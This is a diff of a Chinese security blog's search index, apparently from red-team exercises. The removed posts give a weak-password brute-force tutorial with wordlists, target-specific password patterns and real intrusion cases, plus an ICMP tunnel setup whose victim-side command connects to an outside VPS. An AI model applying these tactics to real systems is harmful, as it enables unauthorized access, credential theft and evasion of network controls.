@@ -1,64 +1,166 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>hw简单总结</title>
-      <link href="2020/11/01/hw%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
-      <url>2020/11/01/hw%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
-      
-        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">您好, 这里需要密码.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="da47d84169f20c5dff9c0525208a66f5d3b17ebb9b73a3cf63b6f8ad61a0f288">a4f2d0ded9c3f5257dee015f6c8a3ff9f85039c40de945cebdb2e4ad6b1648c195add37f4f290a399d6e43e8c124d0945473898ed40e75faa229cd9bd6a7903ffdef9b1603dc97859027095b62ab96c9c18994c4e44d9a7ce371b6146e1b7e8882476ca80ae2cbb6c847c2cebf2ce44e037519dd00446400ae2a5cdddd103972e983971b389dc82fc1bcd6b925e8fd9eab7e71863763a48e87b7b8ffa70590a5fae8d0b89a46c401acbf2b675fe9cdfe47cd9d58c798acc1a3a81bd26b40a01cccb0c3d6ed80c7ba879058dd5f63141b7b7ec00c927e9a898e1e3741223d5e3b7ceef1cfad8ae218817b384fd0dfc72688f0c5e6c62a0241552b70cb5de257ce6535ba2e62f0912dbe33c2b6ea3e011e157af2d6c1aecddfb730b27f34d07be874f6389af31ba74de139f06e1d6e0acc6ee29394bcb4ec727159d0cacf68c00a2740301a9658791e53177291ec7724d20af45527c6fed95665a0436e6a128c8801a0b6948841ca340f910a04dc1fc2e721f26ed2b724f070b9e497f59535125a21c9f98431e899ec0757b91b63d230813105cd6764ed9be61039689ce3f34b0d3aa4a54497b8a961765ea82b3c9d454941b6042f8476d1419ca0399885f0406738a232fc70f17c5243d55b9d65bef31aab69ea18087083d9d2eee30f826fd2546594db88297d05d3974ea1cbf156e371d3967ac75dabe0cfd3eee8c8af5413e2df11088346fd8ba9b5eb85b37c6f237cc92213d2dd93a53414b83ba2760e6995393819639ab1c9fc34f222a28076c4ba400b96e6df0430f789df321d593c8b201d66bd2144e34469e8acef4ff09a1a227691b56476830b3f9bd70be10905b93498c8e2039ea45f1fe93c9a2319cda5f7804124e03c2602ab047377ed75c9d8bf79bdfc2920fa95cf53cfd39cadda87f44a2f2fa42eab0e11f28807f452614e35fd0cf610c475b164ff4520b3b67a0e7036b8046bbb15ac704994f6ec1f3e2d6356705ec47b7fb1c927b161a3acb6438136fa3c372b2757c426fc468a30e64ff80d215ab2f880b5ef1f328584074865141327f6c6469777d8565cc2ee6af726581b492c3da264624baaff4bbd166fa76b1a0a2d99f648c526f227e76fb0a1a3cff367615300fa129697f01a2573ef169a7137f5ad6b7b0dd52e376be7010b254218c02b0c66b843c46fc0c4546f8d9e5a02644325dbf037daaa9c2fac6b433f0e9d5a21d655d91d9329015f429c9fb67f9bef1917a159f77a56ba25acaa714aa24bf2ad3ab84a7b441a520ac8fc22011877cf0afa93c100da18339d6e0f445570ce05ccac09145c55658808350fdd4ea101b727bec468c3d7b8a27a58a09cd18571979b29521c7619286b5149d416ad5f99f46cd40e8ab20491b368ff96cd150a8f6908d59990946c625afd3a28fb82996f14cfb5e960aa04baec7f847d8efc842fd8f205e85a97aa72adcd1dd1fbe103a1731a97075dfde3a1bed49028434d4617c9ca306e4cac3770e0aa591b7fb68053d7e1ab12de52486041a821374be80c3927dbee1d0b308502fb68971c78a8d9875ade9310ecf63e2edb6407025fcfd62198e7ce2fba5e5916b4a7d906fcac344cdefed92931e980340cae6c1e29d5c7e71be4dc33f7edeb707d2fbbc754972afca1567f56ee9bbbb65957c5871ccd743693f74eacfdba6a45f62c89778ea6de65f8ff7bff9e78233912c5e1547617c408ece1accd65d0190fd416729350063a66f3ba58ba7dc279d212956c756775f228357a0e6fc71b58ee64dc99e08727c1eb665aa00bf5a6efd33d0e170091c91b061e3a8c5e9a2c26d445050dade41061b7f2aa60d64eca50cfa23a676445292cb8b406dd99fcd29826cdc74f52e2c59c268dec90129add115f58a51db1f8f3cdadc239e0bdf3ffd93e2e94bb8cd949894fb28a19f4d5ba52dd2a197cb5cf97b4737290e280a9ed1c56c13bcd3cc2c67f5323f8b92881483556b8da8d3d1ae8457c7a8c40ee4bf4179a7b690f23a5e4ee9942a96a3bcb6db79edeaeadcde53e570979874774ddc2e0b537b685d4ad31c858ebb90694e9210709b8cb5c7188909eeb4da8eeb82675bdbcd7162b555b4375ecb58c0de9cb7929ae30b33d51ebec5eeef62cf431b2e65e8563376a5d5c60924bdf58b715cb1111a9e1367c0d790af1299c4c4ab9beac438efed73d4632a5f90ec80eb4e9a037ceb023793013c1cb3ce8bce5aa11f6a4693ef3c9ca62c1bcfa604711e3af9c806f0caea9dd228645a9d9b5bc59df54476933eb47b1a677c0b3ab739883a8cf8b2d1b569f09194743ad7e8d09d8b29df246e433b2ed64bb2fc94d13a58b8908ce77eb249295a7fd8b0e21596046b961e0f4779381f13a667497bf1be57498141bc126c5204e8e0992e53faa20e893464836dffa351986c36e08a2209764f214d9556c55fb3ebabf59e4a3fad378f3c2dcd686998e361355b21b30b2c659515e01f98ed555fbcc1b1ebc67b66c9922386fd6f4c507bdc373f71c2d517fdb23ac7c23b91f80d563cc83c6c68920d3ad4f5fede99f8f1ee2cf403f9b3fc9cdb7c8dc068084bc5f80d1d1703142b66a18ec4966824bc518c69e3a4a804bb5570cd7eb4b3d3fd60ff745d7a4e009821e41d0c623c19c6bca05318f445abc5a5fedb5db7a4fb7dd0cdb01a3a7707a9c41d94ed76e4de584e77f2f87dbc308f60affe930451626acf2345eda1a4fed9c2bd9dcbd16df17d1960f3269a1688f6b7d72319ac599f11dd6168d1f009a131dfdf42bc718dbbf2cd5925c988a54088b692d599c077df360b72910f96cbaeff6e70490100ce9353cc0853c5e4ca0fe9c212d811995c5cf7afbbee9f193a7dacc2299cd12e64cd828e3baf543db3433d40f337d67e4296f3ec2b1cef6e353a88d144c594ef572cef0201d21c8160a7fad841f7f516fe3ca0d65bd1ad06b82d85fe30d2c4e14034e17cde6154e2ba8864c97d43ec4cd739c888f4936c243aacaafe8fbacafe1c4e267f498936b606f4760157110857b0bce20018ab871b8315a8b4880dd61804a75f48940701982564220840f4dc26123d46cafebfe692d8cbe1c06333667e1dd9bfc921f766d2923cb7cfe864981b7b874b7e2a9847f235ed6213de6d9d362776959efd7cba6210f58884c237df3dbde359b05ace3335a46bed1082dbdfc67aa96c2a3b7844ee2852ab22ea77bb8d2df94713670e9798b6c6744534b96b55e1ed1c71d4ad9ecb84461e8cee9602b10ff9d97e9c3a1ae19d945dfad8a5ab92a4bcb5e3aa483a57ec629b60f8eddd3474738785fcc1688f0a1cffb9c1ed4f848c8b2a754e48db00e3b420c20b768799f066caaf59c48e7b4a2a15c372ef4217c3d435b4d221ef8b3c4b91e90ce1a2850ecd53ec34ca64c270c407c62db9a90a37eaa7a409e48258091203926e2312f4710885d2d609178716a9996a4c4ecffd4b654c4209ae89ea07a522f97def1deb57c4ff38e14d4535a9944773ba1e314d838e78bdbe546d4eaf31acdd78941778995d2aeaa961d72d015b0a02974ecc1f25cf9eb019fe7bce8482e988530dfeb05f464708b882ed31c4750ce1607fbce12de54d739de4e81669ae6904944ac944af6197f2272e93db65d87c01b583967a7724af19ee3e98ac0b128d3f75274deac998fe6d50c8199166ed554fb7cdb0591676184f5f15be61ce065f86b08a232975beebe0f5b02e6bef805051907ccc8332ce2d72d65a272d655c56c6da08dfd7d88df2a038cb64e320ed32baa579a0508271028410e07f529891d002e85561e42783abc4ccc5f4fd5ded273f9e4971a8ae55caa21d24e4dc94b477b2ed932f0d95b3f26a9c281f3c958e423c4a9eb66f0fe5893d0d3c3ec0281448fc8acf16d3b1bb07d83ca63dfe42f0e782e55f3fe852304270fed022686d3ee5082ae506791eba3c4a1e34da28648c0d976c5c94d2876b244ce120a1e0a64bb7f572971a0740c37d3538c3ef007543b6890d8262b3c2e381f49e5ec8217edebdd5305e6427b9ab4b63893d57f6ce94f103635022fe09d7c67adcbd2d252fb8a502bae596aa76734bd6033c93de72668b2fe5886755817a969e63d62f973f87f9cd40595452461d2180a888bffdb0d00af7682917daf15de4a05ba8ae1a59cc5ac8d0f498b494138f166e906362e977c4204b22cb60bc828eda1af1a5f8d60be537b9c61a94df2a872d5ac72bc310800b6057883f8ff835a903602ab8f5d0442218b84f7ec4b3bfb18e5cd3417fbb551bdf9c0906487cb84816784466135ad0c9523d7fca757333ff76cdd4f795424a7fc1cc21d6038772f2c26cbf42a5cb2323ff45aa3e5d25e80264c6ff37d84</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> hw </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>浅谈弱口令爆破思路</title>
-      <link href="2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/"/>
-      <url>2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/</url>
-      
-        <content type="html"><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>无论是内网渗透还是外网渗透，无论是web应用还是ssh、rdp、mysql等常见应用，弱口令爆破都是<strong>值得</strong>尝试的一个途径。</p><a id="more"></a><h4 id="二、字典"><a href="#二、字典" class="headerlink" title="二、字典"></a>二、字典</h4><p>字典决定了弱口令爆破的成功与否，字典分为用户名和密码。</p><p>在近几次开展的攻防演戏活动中，整理了爆破成功的大概下面几种类型。</p><h5 id="1、用户名"><a href="#1、用户名" class="headerlink" title="1、用户名"></a>1、用户名</h5><p>常见用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">Admin</span><br><span class="line">scacdmin</span><br><span class="line">strong</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">test1</span><br><span class="line">john</span><br></pre></td></tr></table></figure><p>数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">123</span><br><span class="line">860</span><br></pre></td></tr></table></figure><p>手机号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17865154061</span><br></pre></td></tr></table></figure><blockquote><p>收集那个地区的手机号进行爆破</p><p>社工公司内部员工</p></blockquote><p>姓名拼音</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yanli</span><br><span class="line">dj_yao</span><br><span class="line">yanshi</span><br></pre></td></tr></table></figure><blockquote><p>P牛的星球看到的：大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做</p><p>对于千人及以下的中小型创业公司，企查查和爱企查爬一下这个公司的专利信息列表</p></blockquote><blockquote><p>使用下面的项目字典生成很简单</p><p><a href="https://github.com/LandGrey/ChineseMaskReflector">https://github.com/LandGrey/ChineseMaskReflector</a></p><p>目前我的字典包含如下（中国姓名top500），孙大圣为例</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sundasheng</span><br><span class="line">sunds</span><br><span class="line">dssun</span><br><span class="line">sds</span><br><span class="line">ds_sun</span><br><span class="line">dashengsun</span><br><span class="line">Sundasheng</span><br><span class="line">Sds</span><br></pre></td></tr></table></figure><blockquote><p>上面的也可以用到自定义密码生成中</p></blockquote><p>域名、地域名、机关名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>关键</p></blockquote><h5 id="2、密码"><a href="#2、密码" class="headerlink" title="2、密码"></a>2、密码</h5><p>常见密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">admin</span><br><span class="line">manage</span><br><span class="line">strong</span><br><span class="line">11111</span><br><span class="line">admin123!</span><br><span class="line">12345678;abc</span><br><span class="line">12345!@#$%abc</span><br><span class="line">Passw0rd</span><br><span class="line">p@ssword</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>自定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Admin&#x2F;Cx123456（cx市）</span><br><span class="line">xzadmin&#x2F;xz@123456（xz市）</span><br><span class="line">strong&#x2F;yyslj!@#123（yy市水利局）</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p></blockquote><p>先写入data.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zhejiang</span><br><span class="line">243536998</span><br><span class="line">sundasheng</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -extend data.txt --level 3 --len 4 16</span><br></pre></td></tr></table></figure><blockquote><p>另外一个更加自定义的工具</p><p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1</a></p><p>使用举例：<a href="https://www.cnblogs.com/cwkiller/p/12741086.html">https://www.cnblogs.com/cwkiller/p/12741086.html</a></p></blockquote><p>域名+数字</p><p>域名+admin</p><p>admin+域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">top100，</span><br><span class="line">mct@2020</span><br><span class="line">yanyi@mct.gov.cn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jxsdyyyadmin**市第一医院</span><br></pre></td></tr></table></figure><blockquote><p>下面的是以前看到的，忘记出处了。结合白鹿生成器快速生成</p></blockquote><p><strong>账号规则</strong><br>以下均可尝试大小写：<br>admin+用户名缩写，比如用户叫张三，账号为adminzs<br>地名，比如地名叫傻蛋，账号为shadan<br>域名缩写，比如网站为<a href="http://www.test.com/">www.test.com</a>，账号为test<br>驻点单位名缩写_人名缩写_运维所属公司名缩写，比如驻点单位为天真傻蛋云平台，运维叫做张三，所属公司是犯贱有限公司，账号为tzsd_zs_fj<br>地名_邮编号码，比如地名是傻蛋，对应编号是000000，账号为sd_000000<br>测试账号+人名，比如anquanceshi、test、ceshi、ceshi_zs等等。<br><strong>密码规则</strong><br>以下均可尝试大小写：<br>键盘字母连键+特殊符号+键盘数字连键，字母和数字对应，比如键盘上asdf连着，密码为asdf<a href="https://www.t00ls.net/space-uid-8446.html">@1234</a><br>单位名称缩写/域名+特殊符号+3位或4位随机数，比如<a href="http://www.test.com/">www.test.com</a>，密码为test@2016<br>单位名缩写+人名缩写@工号，比如天真傻蛋大数据平台，运维叫张三，工号9541，密码为tzsdzs@9541<br>运维公司缩写+特殊符号+工号，比如天真傻蛋公司，工号是59861，密码为tzsd@59861</p><p>用户名admin</p><p>密码域名+8899</p><h5 id="3、安全设备默认口令"><a href="#3、安全设备默认口令" class="headerlink" title="3、安全设备默认口令"></a>3、安全设备默认口令</h5><blockquote><p><a href="https://www.freebuf.com/column/235632.html">https://www.freebuf.com/column/235632.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect</a></p></blockquote><h4 id="三、爆破思路"><a href="#三、爆破思路" class="headerlink" title="三、爆破思路"></a>三、爆破思路</h4><p>1、固定用户名爆破密码</p><p><code>admin</code>、<code>test</code>、<code>ceshi</code></p><p>2、固定密码爆破用户名</p><p><code>123456</code>、<code>111111</code></p><p>3、用户名与密码相同</p><p>4、验证码对抗</p><p><code>Captcha-killer</code>插件</p><h4 id="四、真实案例"><a href="#四、真实案例" class="headerlink" title="四、真实案例"></a>四、真实案例</h4><h5 id="1、学校VPN"><a href="#1、学校VPN" class="headerlink" title="1、学校VPN"></a>1、学校VPN</h5><p>微博超话获取到了学生的vpn账号</p><p>入学通知获取到了姓名、学号，社工获取身份证号</p><h5 id="2、离线爆破"><a href="#2、离线爆破" class="headerlink" title="2、离线爆破"></a>2、离线爆破</h5><p>一次实战中sql注入得到了后台账号密码，加盐md5，但是只解出了一组为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin1&#x2F;admin123!</span><br></pre></td></tr></table></figure><p>根据域名等信息，并根据上面的格式生成字典爆破出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;*****123!</span><br></pre></td></tr></table></figure><h5 id="3、账号密码都为域名缩写"><a href="#3、账号密码都为域名缩写" class="headerlink" title="3、账号密码都为域名缩写"></a>3、账号密码都为域名缩写</h5><p>一次实战中<code>hp**/hp**</code></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 爆破 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>pingtunnel搭建icmp隧道</title>
-      <link href="2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/"/>
-      <url>2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
-      
-        <content type="html"><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p><a id="more"></a><h4 id="二、原理及工具"><a href="#二、原理及工具" class="headerlink" title="二、原理及工具"></a>二、原理及工具</h4><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gk7rx68q2cj30xs0hg7bw.jpg" alt="image-20201030232122100"></p><h4 id="三、隧道搭建"><a href="#三、隧道搭建" class="headerlink" title="三、隧道搭建"></a>三、隧道搭建</h4><h5 id="1、建立ICMP通道"><a href="#1、建立ICMP通道" class="headerlink" title="1、建立ICMP通道"></a>1、建立ICMP通道</h5><p>受害机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\TEMP\pingtunnel32.exe -type client -l :4455 -s 118.178.88.46 -sock5 1</span><br></pre></td></tr></table></figure><p>vps</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure><h5 id="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"><a href="#2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）" class="headerlink" title="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"></a>2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）</h5><blockquote><p>别用IE的套接字当做socks5代理，proxifier全局代理或者浏览器socks5插件</p><p>虚拟机测试似乎不行</p></blockquote><h5 id="3、开启frp代理"><a href="#3、开启frp代理" class="headerlink" title="3、开启frp代理"></a>3、开启frp代理</h5><p>Frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 118.178.88.46</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">http_proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:4455</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6667</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>这里的关键是frp去连接服务端时需要配置本地socks5代理。</p><hr><p>最后，感谢戴哥哥和超哥的耐心解答。</p><h4 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h4><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 代理 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+<search>
+  <entry>
+    <title>hw简单总结</title>
+    <url>/2020/11/01/hw%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">您好, 这里需要密码.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="c52913a841bdb3b56ee3fc1343470443478cde5ba62e630bed14e7c4da4ddb8f">a4f2d0ded9c3f5257dee015f6c8a3ff9f85039c40de945cebdb2e4ad6b1648c195add37f4f290a399d6e43e8c124d0945473898ed40e75faa229cd9bd6a7903ffdef9b1603dc97859027095b62ab96c9c18994c4e44d9a7ce371b6146e1b7e8882476ca80ae2cbb6c847c2cebf2ce44e037519dd00446400ae2a5cdddd103972e983971b389dc82fc1bcd6b925e8fd9eab7e71863763a48e87b7b8ffa70590a5fae8d0b89a46c401acbf2b675fe9cdfe47cd9d58c798acc1a3a81bd26b40a01cccb0c3d6ed80c7ba879058dd5f63141b7b7ec00c927e9a898e1e3741223d5e3b7ceef1cfad8ae218817b384fd0dfc72688f0c5e6c62a0241552b70cb5de257ce6535ba2e62f0912dbe33c2b6ea3e011e157af2d6c1aecddfb730b27f34d07be874f6389af31ba74de139f06e1d6e0acc6ee29394bcb4ec727159d0cacf68c00a2740301a9658791e53177291ec7724d20af45527c6fed95665a0436e6a128c8801a0b6948841ca340f910a04dc1fc2e721f26ed2b724f070b9e497f59535125a21c9f98431e899ec0757b91b63d230813105cd6764ed9be61039689ce3f34b0d3aa4a54497b8a961765ea82b3c9d454941b6042f8476d1419ca0399885f0406738a232fc70f17c5243d55b9d65bef31aab69ea18087083d9d2eee30f826fd2546594db88297d05d3974ea1cbf156e371d3967ac75dabe0cfd3eee8c8af5413e2df11088346fd8ba9b5eb85b37c6f237cc92213d2dd93a53414b83ba2760e6995393819639ab1c9fc34f222a28076c4ba400b96e6df0430f789df321d593c8b201d66bd2144e34469e8acef4ff09a1a227691b56476830b3f9bd70be10905b93498c8e2039ea45f1fe93c9a2319cda5f7804124e03c2602ab047377ed75c9d8bf79bdfc2920fa95cf53cfd39cadda87f44a2f2fa42eab0e11f28807f452614e35fd0cf610c475b164ff4520b3b67a0e7036b8046bbb15ac704994f6ec1f3e2d6356705ec47b7fb1c927b161a3acb6438136fa3c372b2757c426fc468a30e64ff80d215ab2f880b5ef1f328584074865141327f6c6469777d8565cc2ee6af726581b492c3da264624baaff4bbd166fa76b1a0a2d99f648c526f227e76fb0a1a3cff367615300fa129697f01a2573ef169a7137f5ad6b7b0dd52e376be7010b254218c02b0c66b843c46fc0c4546f8d9e5a02644325dbf037daaa9c2fac6b433f0e9d5a21d655d91d9329015f429c9fb67f9bef1917a159f77a56ba25acaa714aa24bf2ad3ab84a7b441a520ac8fc22011877cf0afa93c100da18339d6e0f445570ce05ccac09145c55658808350fdd4ea101b727bec468c3d7b8a27a58a09cd18571979b29521c7619286b5149d416ad5f99f46cd40e8ab20491b368ff96cd150a8f6908d59990946c625afd3a28fb82996f14cfb5e960aa04baec7f847d8efc842fd8f205e85a97aa72adcd1dd1fbe103a1731a97075dfde3a1bed49028434d4617c9ca306e4cac3770e0aa591b7fb68053d7e1ab12de52486041a821374be80c3927dbee1d0b308502fb68971c78a8d9875ade9310ecf63e2edb6407025fcfd62198e7ce2fba5e5916b4a7d906fcac344cdefed92931e980340cae6c1e29d5c7e71be4dc33f7edeb707d2fbbc754972afca1567f56ee9bbbb65957c5871ccd743693f74eacfdba6a45f62c89778ea6de65f8ff7bff9e78233912c5e1547617c408ece1accd65d0190fd416729350063a66f3ba58ba7dc279d212956c756775f228357a0e6fc71b58ee64dc99e08727c1eb665aa00bf5a6efd33d0e170091c91b061e3a8c5e9a2c26d445050dade41061b7f2aa60d64eca50cfa23a676445292cb8b406dd99fcd29826cdc74f52e2c59c268dec90129add115f58a51db1f8f3cdadc239e0bdf3ffd93e2e94bb8cd949894fb28a19f4d5ba52dd2a197cb5cf97b4737290e280a9ed1c56c13bcd3cc2c67f5323f8b92881483556b8da8d3d1ae8457c7a8c40ee4bf4179a7b690f23a5e4ee9942a96a3bcb6db79edeaeadcde53e570979874774ddc2e0b537b685d4ad31c858ebb90694e9210709b8cb5c7188909eeb4da8eeb82675bdbcd7162b555b4375ecb58c0de9cb7929ae30b33d51ebec5eeef62cf431b2e65e8563376a5d5c60924bdf58b715cb1111a9e1367c0d790af1299c4c4ab9beac438efed73d4632a5f90ec80eb4e9a037ceb023793013c1cb3ce8bce5aa11f6a4693ef3c9ca62c1bcfa604711e3af9c806f0caea9dd228645a9d9b5bc59df54476933eb47b1a677c0b3ab739883a8cf8b2d1b569f09194743ad7e8d09d8b29df246e433b2ed64bb2fc94d13a58b8908ce77eb249295a7fd8b0e21596046b961e0f4779381f13a667497bf1be57498141bc126c5204e8e0992e53faa20e893464836dffa351986c36e08a2209764f214d9556c55fb3ebabf59e4a3fad378f3c2dcd686998e361355b21b30b2c659515e01f98ed555fbcc1b1ebc67b66c9922386fd6f4c507bdc373f71c2d517fdb23ac7c23b91f80d563cc83c6c68920d3ad4f5fede99f8f1ee2cf403f9b3fc9cdb7c8dc068084bc5f80d1d1703142b66a18ec4966824bc518c69e3a4a804bb5570cd7eb4b3d3fd60ff745d7a4e009821e41d0c623c19c6bca05318f445abc5a5fedb5db7a4fb7dd0cdb01a3a7707a9c41d94ed76e4de584e77f2f87dbc308f60affe930451626acf2345eda1a4fed9c2bd9dcbd16df17d1960f3269a1688f6b7d72319ac599f11dd6168d1f009a131dfdf42bc718dbbf2cd5925c988a54088b692d599c077df360b72910f96cbaeff6e70490100ce9353cc0853c5e4ca0fe9c212d811995c5cf7afbbee9f193a7dacc2299cd12e64cd828e3baf543db3433d40f337d67e4296f3ec2b1cef6e353a88d144c594ef572cef0201d21c8160a7fad841f7f516fe3ca0d65bd1ad06b82d85fe30d2c4e14034e17cde6154e2ba8864c97d43ec4cd739c888f4936c243aacaafe8fbacafe1c4e267f498936b606f4760157110857b0bce20018ab871b8315a8b4880dd61804a75f48940701982564220840f4dc26123d46cafebfe692d8cbe1c06333667e1dd9bfc921f766d2923cb7cfe864981b7b874b7e2a9847f235ed6213de6d9d362776959efd7cba6210f58884c237df3dbde359b05ace3335a46bed1082dbdfc67aa96c2a3b7844ee2852ab22ea77bb8d2df94713670e9798b6c6744534b96b55e1ed1c71d4ad9ecb84461e8cee9602b10ff9d97e9c3a1ae19d945dfad8a5ab92a4bcb5e3aa483a57ec629b60f8eddd3474738785fcc1688f0a1cffb9c1ed4f848c8b2a754e48db00e3b420c20b768799f066caaf59c48e7b4a2a15c372ef4217c3d435b4d221ef8b3c4b91e90ce1a2850ecd53ec34ca64c270c407c62db9a90a37eaa7a409e48258091203926e2312f4710885d2d609178716a9996a4c4ecffd4b654c4209ae89ea07a522f97def1deb57c4ff38e14d4535a9944773ba1e314d838e78bdbe546d4eaf31acdd78941778995d2aeaa961d72d015b0a02974ecc1f25cf9eb019fe7bce8482e988530dfeb05f464708b882ed31c4750ce1607fbce12de54d739de4e81669ae6904944ac944af6197f2272e93db65d87c01b583967a7724af19ee3e98ac0b128d3f75274deac998fe6d50c8199166ed554fb7c